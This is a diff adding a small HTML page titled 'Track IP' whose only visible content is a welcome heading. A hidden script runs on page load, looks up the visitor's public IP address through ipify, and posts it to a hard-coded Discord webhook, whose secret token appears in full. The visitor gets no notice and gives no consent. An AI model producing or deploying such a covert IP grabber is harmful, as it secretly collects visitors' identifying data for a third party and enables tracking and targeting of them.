@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Track IP</title>
+</head>
+<body>
+    <h1>Welcome to My Website</h1>
+
+    <script>
+        function sendIPToDiscord() {
+            // Lấy IP công khai của người dùng qua API ipify
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+
+                    // Định dạng nội dung gửi tới Discord
+                    const message = {
+                        content: `📍 IP Address: ${ip} đã truy cập vào trang của bạn`
+                    };
+
+                    // Gửi IP tới Discord webhook
+                    fetch('https://discord.com/api/webhooks/1300088629174997096/luhXCiQg7236kLDa8ONjbnB9600i3bGofgQ0MA6O-YcEJWuXaY2lThAmErSaAVgi1loq/github', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(message)
+                    })
+                    .then(response => console.log('IP Sent:', ip))
+                    .catch(error => console.error('Error:', error));
+                });
+        }
+
+        // Gọi hàm khi trang được tải
+        sendIPToDiscord();
+    </script>
+</body>
+</html>
